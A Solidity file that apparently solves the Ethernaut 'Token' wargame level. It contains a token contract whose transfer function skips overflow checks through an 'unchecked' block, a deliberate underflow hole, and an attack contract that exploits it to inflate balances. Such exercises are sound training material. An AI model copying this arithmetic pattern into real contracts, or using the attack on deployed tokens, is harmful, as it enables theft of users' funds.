// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract EthernautToken {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    constructor(uint256 initialSupply) {
        totalSupply = initialSupply;
        balances[msg.sender] = initialSupply;
    }

    function transfer(address to, uint256 value) public returns (bool) {
        unchecked {
            balances[msg.sender] -= value;
            balances[to] += value;
        }
        return true;
    }
}

contract TokenAttack {
    function attack(EthernautToken target, address recipient, uint256 amount) external {
        target.transfer(recipient, amount);
    }
}
